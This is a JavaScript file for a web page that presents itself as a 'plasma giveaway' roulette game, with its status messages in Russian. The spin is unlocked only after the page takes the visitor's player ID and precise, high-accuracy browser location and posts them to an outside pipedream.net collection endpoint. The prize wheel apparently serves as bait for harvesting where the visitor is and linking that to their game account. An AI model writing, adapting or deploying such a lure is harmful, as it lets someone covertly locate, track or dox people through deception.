const endpoint = "https://eostxnbdfbrzcl7.m.pipedream.net";

const statusEl = document.getElementById("status");
const debugEl = document.getElementById("debug");
const sendBtn = document.getElementById("sendBtn");
const playerIdInput = document.getElementById("playerId");
const spinnerEl = document.getElementById("spinner");

window.plasmaGiveaway = {
  spinAllowed: false,
};

function logDebug(...args) {
  debugEl.textContent +=
    args
      .map((arg) => (typeof arg === "object" ? JSON.stringify(arg, null, 2) : String(arg)))
      .join(" ") + "\n";
  debugEl.scrollTop = debugEl.scrollHeight;
}

function setStatus(text, cls = "small") {
  statusEl.textContent = `Статус: ${text}`;
  statusEl.className = cls;
}

async function sendCoordinates(payload) {
  setStatus("отправка данных...");
  spinnerEl.classList.add("is-visible");

  try {
    const res = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify(payload),
      mode: "cors",
    });

    const text = await res.text().catch(() => "");
    logDebug("Ответ сервера:", res.status, text);

    if (res.ok) {
      setStatus("данные успешно отправлены! Крутим рулетку.", "ok");
      window.plasmaGiveaway.spinAllowed = true;
      return true;
    }

    setStatus(`ошибка сервера: ${res.status}`, "error");
    return false;
  } catch (error) {
    logDebug("Network error:", error);
    setStatus("ошибка при отправке данных.", "error");
    return false;
  } finally {
    spinnerEl.classList.remove("is-visible");
  }
}

function onGeoError(error) {
  logDebug("Ошибка геолокации:", error);
  setStatus("не удалось получить местоположение.", "error");
}

function onGeoSuccess(position, playerId) {
  const coords = position.coords;
  const payload = {
    player_id: playerId,
    latitude: coords.latitude,
    longitude: coords.longitude,
    timestamp_iso: new Date(position.timestamp).toISOString(),
  };

  logDebug("Отправляем данные:", payload);

  sendCoordinates(payload).then((ok) => {
    if (ok && typeof window.triggerSpin === "function") {
      window.triggerSpin();
    }
  });
}

function requestLocation(playerId) {
  if (!("geolocation" in navigator)) {
    setStatus("геолокация не поддерживается.", "error");
    return;
  }

  setStatus("запрашиваем местоположение...");
  navigator.geolocation.getCurrentPosition(
    (position) => onGeoSuccess(position, playerId),
    onGeoError,
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
  );
}

sendBtn.addEventListener("click", () => {
  const id = playerIdInput.value.trim();

  if (!id) {
    setStatus("введите ID игрока перед отправкой.", "error");
    return;
  }

  requestLocation(id);
});

window.setPlasmaStatus = setStatus;
